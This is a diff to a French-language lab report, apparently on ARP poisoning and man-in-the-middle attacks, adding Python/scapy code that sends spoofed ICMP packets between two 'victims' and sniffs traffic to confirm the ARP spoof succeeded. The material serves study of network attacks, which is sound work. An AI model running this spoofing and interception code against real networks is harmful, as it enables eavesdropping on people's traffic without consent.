@@ -137,6 +137,54 @@ while 1:
 192.168.58.4 dev enp0s8 lladdr 08:00:27:bf:27:f4 STALE
 ```
 [Trames ARP](./Trames/arp_poisoning.pcapng)
+
+Vérification de bon fonctionnement du ARP poisonning dans le programme main.py avec des pings :
+```python=
+# Valeur dans le tableau vraie si l'ARP spoof a fonctionné sur la victime en question
+poisoning = [False]*2 
+# Démarre un sous-process envoyant des pings
+pings = subprocess.Popen("python Resources/pings.py".split(), stdout=subprocess.PIPE) 
+for i in range(0,50): # Boucle tant que l'ARP spoof n'a pas été confirmé
+    # Intercepte les pings
+    packets = sniff(iface=iface, filter="icmp", count=4)
+    # Analyse les pings interceptés
+    for p in packets:
+        try:
+            if p[IP].dst == victims_infos[0] and p[Ether].dst == ip_mac[1]:
+                poisoning[0] = True
+            if p[IP].dst == victims_infos[2] and p[Ether].dst == ip_mac[1]:
+                poisoning[1] = True
+        except IndexError:
+            break
+        if poisoning[0] == True and poisoning[1] == True:
+            break
+    if poisoning[0] == poisoning[1] == True:
+            break
+pings.terminate() # Interrompt le sous-process
+```
+[pings.py](./Program/Resources/pings.py)
+```python=
+import sys
+from scapy.all import *
+import time
+
+# Récupère les données nécessaire au script
+fichier = open("Resources/informations.txt", "r")
+contenu = fichier.read().split()
+fichier.close()
+
+# Adresses IP des victimes
+ip_victime1 = contenu[0]
+ip_victime2 = contenu[2]
+# Nom de l'interface réseau sur laquelle l'attaque est effectué
+iface = contenu[6]
+
+# Envoie à victime1 en tant que victime2 et inversement
+while True:
+    send(IP(src=ip_victime1, dst=ip_victime2)/ICMP(), iface=iface)
+    send(IP(src=ip_victime2, dst=ip_victime1)/ICMP(), iface=iface)
+    time.sleep(1)
+```
 ### B. MITM
 [transfer_packets.py](./Program/Resources/transfer_packets.py)
 ```python=
